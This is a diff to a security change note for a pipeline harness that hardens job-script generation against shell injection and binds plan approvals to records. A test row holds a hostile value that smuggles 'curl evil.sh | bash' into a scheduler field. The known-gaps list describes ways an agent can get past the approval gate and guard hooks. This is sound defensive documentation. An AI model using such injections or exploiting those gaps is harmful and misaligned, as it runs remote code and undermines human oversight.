@@ -14,6 +14,7 @@ symptoms:
   - hand-written "Status: APPROVED" passes stage03 verify
   - PLAN.md edited after approval still verifies
   - compute.work_dir with $(...) runs a command when the job script runs
+  - a line break in compute.partition/time/cpus/mem adds an executing line to submit.sh
 ---
 # A call the guard cannot judge is refused, an approval is bound to the plan it approved, and work_dir cannot carry shell expansion
 
@@ -60,11 +61,15 @@ The first review swept 44 contract-instructed command shapes through the hook, a
 - `approve` detects the stamp as a line (`^Status: APPROVED`), not as words anywhere in the plan. A stamped plan with no matching record is refused. A plan set back to DRAFT while a record exists is refused: approval happens once per analysis, and a change of mind is a new analysis.
 - The guard denies writing the record by Write/Edit and by the Bash write targets above.
 
-### 4. `compute.work_dir` cannot carry shell expansion
+### 4. The `compute.*` values that reach the job script cannot carry shell expansion or a line break
 
-`wrapperlib.check_config_common`, which every wrapper runs, refuses a `compute.work_dir` containing `$`, a backtick, `"`, `\`, or a line break: the characters bash expands or unquotes inside double quotes.
-A plain path, including one with spaces, and an `s3://` URI still pass, and no job script's bytes change.
-The other part of `work_dir`, the project folder name, is produced by stage 00's `sanitize_title` (`[A-Za-z0-9_-]` only).
+`wrapperlib.check_config_common`, which every wrapper runs, refuses `$`, a backtick, `"`, `\`, or a line break in:
+
+- `compute.work_dir`, rendered inside double quotes in every nf-core job body, where bash expands or unquotes exactly those characters. A plain path, including one with spaces, and an `s3://` URI still pass. The other part of `work_dir`, the project folder name, comes from stage 00's `sanitize_title` (`[A-Za-z0-9_-]` only).
+- `compute.partition`, `compute.time`, `compute.cpus` and `compute.mem`, rendered verbatim by `executorlib.header_lines` into the job script's directive lines (`#SBATCH --partition={partition}`), where a line break starts a new line the shell executes (0042 review round 2, MAJ-3). No real scheduler value needs any of these characters.
+
+No job script's bytes change for a legitimate config.
+Other `cfg`-derived values checked by the round-2 review are not shell lines: `de.formula` and `de.contrast` enter `run_de.py` as Python `repr` literals, and formula terms are validated against design columns.
 
 **Migration.** An analysis approved before this change and not yet verified has no record; `verify` refuses it, and the recovery is `create` again.
 Completed analyses are unaffected.
@@ -81,6 +86,7 @@ Known to still pass on this change:
 - **The approval gate itself:** the agent can still run `stage03_analysis.py approve` before the user says yes, and the recorded `actor` is the OS user, not a verified human. The gate remains the contract's prose (step 6) until an approval command the agent cannot reach exists.
 - **Guard scope:** the hook runs only for Claude Code sessions rooted at `gars/`. A session at the repository root, or another harness, runs unguarded (assessment question D-26, ruled to rows 4 and 15).
 - **Bypass-switch denies** (`--no-verify`, `hooks.gitleaks false`) remain row 15.
+- **The executor descriptor itself.** `_config/executor.yaml`'s `directives` and `submit_argv` lines are rendered verbatim; `executorlib.validate()` checks only their `{tokens}`. The descriptor is a workspace-level file rather than a per-assay value, but a session that can write it can put any line into every generated job script.
 
 **Deliberate false positives** (none contract-instructed): inline interpreter code that only *reads* a protected path (`python3 -c "print(open('_references/x').read())"`) is refused; `mv` of an approval record out of its analysis is refused.
 
@@ -101,6 +107,7 @@ In `tests/run_tests.py`. **Red at `fc4749a`** means the test fails there at the 
 | `WorkspaceFixture.test_12e_reapproval_after_reset_is_refused` | errors at `fc4749a` (no record) |
 | `WorkspaceFixture.test_12f_stamp_words_in_prose_are_not_a_stamp` | fails at `fc4749a` (no record is written); guards the line-anchored stamp match |
 | `ExecutorSeamTests.test_07g_work_dir_cannot_carry_shell_expansion` | red at `fc4749a` |
+| `ExecutorSeamTests.test_07h_scheduler_values_cannot_break_the_header` | red at `fc4749a` (`compute.partition='cpu\ncurl evil.sh \| bash'` not refused) |
 
 `WorkspaceFixture` tests build on each other's project; run the class, not a single test.
 
